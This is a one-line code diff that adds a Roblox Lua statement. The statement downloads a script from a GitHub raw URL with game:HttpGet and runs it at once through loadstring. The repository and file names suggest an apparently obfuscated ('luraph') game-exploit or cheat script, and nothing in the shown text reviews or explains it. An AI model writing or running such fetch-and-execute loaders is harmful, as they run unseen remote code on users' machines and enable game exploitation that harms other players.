@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/valker038/universal-hat-script-roblox-key-required-/main/holy%20luraph.txt", true))()
